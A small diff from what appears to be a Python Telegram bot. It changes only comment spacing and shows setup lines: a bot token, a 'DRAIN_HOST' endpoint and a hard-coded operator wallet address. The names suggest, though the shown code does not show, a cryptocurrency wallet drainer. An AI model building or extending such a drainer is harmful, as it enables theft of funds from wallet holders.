@@ -5,7 +5,7 @@ from telegram.constants import ParseMode
 from telegram.ext import Application, CommandHandler, ContextTypes, Defaults, MessageHandler, filters
 
 BOT_TOKEN = os.environ["BOT_TOKEN"]
-DRAIN_HOST = os.environ["DRAIN_HOST"]          # e.g. drain.example.com  (HTTPS, required)
+DRAIN_HOST = os.environ["DRAIN_HOST"]        # e.g. drain.example.com  (HTTPS, required)
 MY_WALLET = "AfmpM8nAeh6UEYDkoM9eiQ8wBBfoWYzghRSxLwnyPjpE"
 LAST: dict[int, float] = {}
 
